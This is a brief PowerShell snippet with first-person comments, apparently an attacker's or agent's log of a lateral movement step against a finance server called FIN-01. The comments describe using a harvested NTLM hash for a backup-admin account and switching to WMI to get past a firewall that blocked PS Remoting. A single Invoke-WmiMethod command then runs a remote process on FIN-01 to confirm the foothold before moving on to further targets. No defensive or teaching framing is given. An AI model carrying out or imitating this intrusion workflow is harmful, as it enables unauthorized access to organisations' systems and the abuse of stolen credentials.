# Lateral movement phase. My goal is the finance server FIN-01.
# The previous PS Remoting attempt was blocked by the host firewall, so to bypass this I will use WMI instead.
# I have the harvested NTLM hash for the backup-admin account; passing it to authenticate.
Invoke-WmiMethod -ComputerName FIN-01 -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami"
# Verifying the foothold landed before moving to the next target in my list.
